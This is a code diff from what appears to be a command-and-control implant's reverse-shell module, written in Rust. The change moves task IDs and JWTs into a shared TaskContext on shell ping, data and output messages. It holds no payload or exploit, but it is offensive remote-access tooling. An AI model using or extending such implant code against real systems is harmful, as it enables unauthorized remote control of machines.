@@ -34,7 +34,10 @@ pub async fn run_repl_reverse_shell<T: Transport + Send + Sync + 'static>(
     // Initial Registration
     if let Err(_err) = output_tx
         .send(ReverseShellRequest {
-            task_id,
+            context: Some(pb::c2::TaskContext {
+                task_id,
+                jwt: jwt.clone(),
+            }),
             kind: ReverseShellMessageKind::Ping.into(),
             data: Vec::new(),
         })
@@ -60,6 +63,7 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
     agent: ImixAgent<T>,
 ) {
     let _ = tokio::task::spawn_blocking(move || {
+        let jwt_clone = jwt.clone();
         let printer = Arc::new(ShellPrinter {
             tx: output_tx.clone(),
             task_id,
@@ -76,6 +80,7 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
         let stdout = VtWriter {
             tx: output_tx.clone(),
             task_id,
+            jwt: jwt_clone.clone(),
         };
         let mut stdout = BufWriter::new(stdout);
 
@@ -88,9 +93,12 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
         while let Some(msg) = input_rx.blocking_recv() {
             if msg.kind == ReverseShellMessageKind::Ping as i32 {
                 let _ = output_tx.blocking_send(ReverseShellRequest {
+                    context: Some(pb::c2::TaskContext {
+                        task_id,
+                        jwt: jwt_clone.clone(),
+                    }),
                     kind: ReverseShellMessageKind::Ping.into(),
                     data: msg.data,
-                    task_id,
                 });
                 continue;
             }
@@ -203,9 +211,12 @@ impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
         let s_crlf = s.replace('\n', "\r\n");
         let display_s = format!("{s_crlf}\r\n");
         let _ = self.tx.blocking_send(ReverseShellRequest {
+            context: Some(pb::c2::TaskContext {
+                task_id: self.task_id,
+                jwt: self.jwt.clone(),
+            }),
             kind: ReverseShellMessageKind::Data.into(),
             data: display_s.into_bytes(),
-            task_id: self.task_id,
         });
 
         // Report Task Output
@@ -217,7 +228,10 @@ impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
                 exec_started_at: None,
                 exec_finished_at: None,
             }),
-            jwt: self.jwt.clone(),
+            context: Some(pb::c2::TaskContext {
+                task_id: self.task_id,
+                jwt: self.jwt.clone(),
+            }),
         };
         let _ = self.agent.report_task_output(req);
     }
@@ -226,9 +240,12 @@ impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
         let s_crlf = s.replace('\n', "\r\n");
         let display_s = format!("{s_crlf}\r\n");
         let _ = self.tx.blocking_send(ReverseShellRequest {
+            context: Some(pb::c2::TaskContext {
+                task_id: self.task_id,
+                jwt: self.jwt.clone(),
+            }),
             kind: ReverseShellMessageKind::Data.into(),
             data: display_s.into_bytes(),
-            task_id: self.task_id,
         });
 
         let req = ReportTaskOutputRequest {
@@ -241,7 +258,10 @@ impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
                 exec_started_at: None,
                 exec_finished_at: None,
             }),
-            jwt: "somejwt".to_string(),
+            context: Some(pb::c2::TaskContext {
+                task_id: self.task_id,
+                jwt: self.jwt.clone(),
+            }),
         };
         let _ = self.agent.report_task_output(req);
     }
